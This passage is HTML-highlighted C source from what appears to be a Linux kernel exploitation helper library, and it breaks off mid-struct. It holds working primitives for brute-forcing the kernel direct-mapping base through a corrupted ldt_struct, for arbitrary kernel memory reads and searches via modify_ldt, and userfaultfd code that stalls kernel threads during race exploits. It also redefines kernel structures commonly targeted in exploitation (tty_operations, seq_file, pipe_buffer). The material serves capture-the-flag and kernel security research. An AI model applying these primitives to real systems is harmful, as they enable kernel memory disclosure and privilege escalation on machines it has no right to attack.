<span class="number">0</span>;</span><br><span class="line">    desc-&gt;contents = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;lm = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;useable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief burte-force hitting page_offset_base by modifying ldt_struct</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_cracker function to make the ldt_struct modifiable</span></span><br><span class="line"><span class="comment"> * @param cracker_args args of ldt_cracker</span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param burte_size size of each burte-force hitting</span></span><br><span class="line"><span class="comment"> * @return size_t address of page_offset_base</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ldt_guessing_direct_mapping_area</span><span class="params">(<span class="keyword">void</span> *(*ldt_cracker)(<span class="keyword">void</span>*),</span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">void</span> *cracker_args,</span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">void</span> *(*ldt_momdifier)(<span class="keyword">void</span>*, <span class="keyword">size_t</span>), </span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">void</span> *momdifier_args,</span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">uint64_t</span> burte_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">	<span class="keyword">uint64_t</span> temp;</span><br><span class="line">	<span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    init_desc(&amp;desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make the ldt_struct modifiable */</span></span><br><span class="line">    ldt_cracker(cracker_args);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak kernel direct mapping area by modify_ldt() */</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        ldt_momdifier(momdifier_args, page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (retval &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] no mm-&gt;context.ldt!&quot;</span>);</span><br><span class="line">            page_offset_base = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        page_offset_base += burte_size;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> page_offset_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief read the contents from a specific kernel memory.</span></span><br><span class="line"><span class="comment"> * Note that we should call ldtGuessingDirectMappingArea() firstly,</span></span><br><span class="line"><span class="comment"> * and the function should be used in that caller process</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param addr address of kernel memory to read</span></span><br><span class="line"><span class="comment"> * @param res_buf buf to be written the data from kernel memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ldt_arbitrary_read</span><span class="params">(<span class="keyword">void</span> *(*ldt_momdifier)(<span class="keyword">void</span>*, <span class="keyword">size_t</span>), </span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">void</span> *momdifier_args, <span class="keyword">size_t</span> addr, <span class="keyword">char</span> *res_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">0x8000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> temp;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    init_desc(&amp;desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* modify the ldt_struct-&gt;entries to addr */</span></span><br><span class="line">    ldt_momdifier(momdifier_args, addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read data by the child process */</span></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        <span class="comment">/* child */</span></span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], buf, <span class="number">0x8000</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* parent */</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], res_buf, <span class="number">0x8000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief seek specific content in the memory.</span></span><br><span class="line"><span class="comment"> * Note that we should call ldtGuessingDirectMappingArea() firstly,</span></span><br><span class="line"><span class="comment"> * and the function should be used in that caller process</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param page_offset_base the page_offset_base we leakked before</span></span><br><span class="line"><span class="comment"> * @param mem_finder your own function to search on a 0x8000-bytes buf.</span></span><br><span class="line"><span class="comment"> *          It should be like `size_t func(void *args, char *buf)` and the `buf`</span></span><br><span class="line"><span class="comment"> *          is where we store the data from kernel in ldt_seeking_memory().</span></span><br><span class="line"><span class="comment"> *          The return val should be the offset of the `buf`, `-1` for failure</span></span><br><span class="line"><span class="comment"> * @param finder_args your own function&#x27;s args</span></span><br><span class="line"><span class="comment"> * @return size_t kernel addr of content to find, -1 for failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ldt_seeking_memory</span><span class="params">(<span class="keyword">void</span> *(*ldt_momdifier)(<span class="keyword">void</span>*, <span class="keyword">size_t</span>), </span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">void</span> *momdifier_args, <span class="keyword">uint64_t</span> page_offset_base,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">size_t</span> (*mem_finder)(<span class="keyword">void</span>*, <span class="keyword">char</span> *), <span class="keyword">void</span> *finder_args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">0x8000</span>];</span><br><span class="line">    <span class="keyword">size_t</span> search_addr, result_addr = <span class="number">-1</span>, offset;</span><br><span class="line"></span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ldt_arbitrary_read(ldt_momdifier, momdifier_args, search_addr, buf);</span><br><span class="line"></span><br><span class="line">        offset = mem_finder(finder_args, buf);</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            result_addr = search_addr + offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VIII - userfaultfd related code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The MUSL also doesn&#x27;t contain `userfaultfd.h` :( </span></span><br><span class="line"><span class="comment"> * Luckily we just need a bit of micros in exploitation, </span></span><br><span class="line"><span class="comment"> * so just define them directly is okay :)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFD_API ((uint64_t)0xAA)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _UFFDIO_REGISTER		(0x00)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _UFFDIO_COPY			(0x03)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _UFFDIO_API			(0x3F)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* userfaultfd ioctl ids */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO 0xAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_API		_IOWR(UFFDIO, _UFFDIO_API,	\</span></span><br><span class="line"><span class="meta">				      struct uffdio_api)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER		_IOWR(UFFDIO, _UFFDIO_REGISTER, \</span></span><br><span class="line"><span class="meta">				      struct uffdio_register)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_COPY		_IOWR(UFFDIO, _UFFDIO_COPY,	\</span></span><br><span class="line"><span class="meta">				      struct uffdio_copy)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read() structure */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint8_t</span>	event;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>	reserved1;</span><br><span class="line">	<span class="keyword">uint16_t</span>	reserved2;</span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved3;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">uint64_t</span>	flags;</span><br><span class="line">			<span class="keyword">uint64_t</span>	address;</span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="keyword">uint32_t</span> ptid;</span><br><span class="line">			&#125; feat;</span><br><span class="line">		&#125; pagefault;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">uint32_t</span>	ufd;</span><br><span class="line">		&#125; fork;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">uint64_t</span>	from;</span><br><span class="line">			<span class="keyword">uint64_t</span>	to;</span><br><span class="line">			<span class="keyword">uint64_t</span>	len;</span><br><span class="line">		&#125; remap;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">uint64_t</span>	start;</span><br><span class="line">			<span class="keyword">uint64_t</span>	end;</span><br><span class="line">		&#125; remove;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="comment">/* unused reserved fields */</span></span><br><span class="line">			<span class="keyword">uint64_t</span>	reserved1;</span><br><span class="line">			<span class="keyword">uint64_t</span>	reserved2;</span><br><span class="line">			<span class="keyword">uint64_t</span>	reserved3;</span><br><span class="line">		&#125; reserved;</span><br><span class="line">	&#125; arg;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFD_EVENT_PAGEFAULT	0x12</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> api;</span><br><span class="line">    <span class="keyword">uint64_t</span> features;</span><br><span class="line">    <span class="keyword">uint64_t</span> ioctls;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_range</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> start;</span><br><span class="line">    <span class="keyword">uint64_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uffdio_range</span> <span class="title">range</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER_MODE_MISSING	((uint64_t)1&lt;&lt;0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER_MODE_WP		((uint64_t)1&lt;&lt;1)</span></span><br><span class="line">    <span class="keyword">uint64_t</span> mode;</span><br><span class="line">    <span class="keyword">uint64_t</span> ioctls;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> dst;</span><br><span class="line">	<span class="keyword">uint64_t</span> src;</span><br><span class="line">	<span class="keyword">uint64_t</span> len;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_COPY_MODE_DONTWAKE		((uint64_t)1&lt;&lt;0)</span></span><br><span class="line">	<span class="keyword">uint64_t</span> mode;</span><br><span class="line">	<span class="keyword">int64_t</span> copy;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//#include &lt;linux/userfaultfd.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> temp_page_for_stuck[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfaultfd</span><span class="params">(<span class="keyword">pthread_t</span> *monitor_thread, <span class="keyword">void</span> *addr,</span></span></span><br><span class="line"><span class="params"><span class="function">                          <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> *(*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s = pthread_create(monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">uffd_handler_for_stucking_thread</span><span class="params">(<span class="keyword">void</span> *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) args;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* just stuck there is okay... */</span></span><br><span class="line">        sleep(<span class="number">100000000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) temp_page_for_stuck;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                                    ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfaultfd_for_thread_stucking</span><span class="params">(<span class="keyword">pthread_t</span> *monitor_thread, </span></span></span><br><span class="line"><span class="params"><span class="function">                                          <span class="keyword">void</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    register_userfaultfd(monitor_thread, buf, len, </span><br><span class="line">                         uffd_handler_for_stucking_thread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IX - kernel structures </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termiox</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> *buf;</span><br><span class="line">	<span class="keyword">size_t</span> size;</span><br><span class="line">	<span class="keyword">size_t</span> from;</span><br><span class="line">	<span class="keyword">size_t</span> count;</span><br><span class="line">	<span class="keyword">size_t</span> pad_until;</span><br><span class="line">	<span class="keyword">loff_t</span> index;</span><br><span class="line">	<span class="keyword">loff_t</span> read_pos;</span><br><span class="line">	<span class="keyword">uint64_t</span> lock[<span class="number">4</span>]; <span class="comment">//struct mutex lock;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>;</span></span><br><span class="line">	<span class="keyword">int</span> poll_event;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *<span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">	<span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read start from len to offset, write start from offset */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span 